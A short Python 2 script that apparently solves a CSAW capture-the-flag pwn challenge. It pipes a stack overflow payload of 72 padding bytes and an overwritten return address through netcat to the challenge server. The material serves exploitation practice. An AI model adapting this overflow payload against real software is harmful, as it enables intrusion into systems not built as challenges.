import subprocess

p = subprocess.Popen(["nc", "pwn.chal.csaw.io", "8000"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
print p.communicate(input="{0}\x11\x06\x40\x00\x00\x00\x00\x00".format("A"*72))
